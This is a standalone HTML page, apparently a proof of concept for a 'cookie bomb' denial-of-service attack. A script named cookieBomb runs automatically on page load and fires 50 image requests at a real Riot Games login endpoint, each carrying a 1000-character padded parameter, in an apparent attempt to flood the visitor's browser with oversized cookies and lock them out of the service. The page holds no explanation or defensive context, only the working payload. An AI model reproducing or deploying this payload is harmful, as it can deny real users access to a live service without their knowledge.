<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>

<body>
  <script>
    async function cookieBomb() {
      const target = 'https://xsso.riotgames.com/login?uri=https://riotgames.com/test?x=' + 'A'.repeat(1000)

      for (let i = 0; i < 50; i++) {
        await new Promise(resolve => {
          const img = new Image()
          img.onload = img.onerror = resolve // either way, the request was made
          img.src = target + '&cachebust=' + Math.random() // prevent caching
        })
      }
    }

    cookieBomb();
  </script>
</body>

</html>
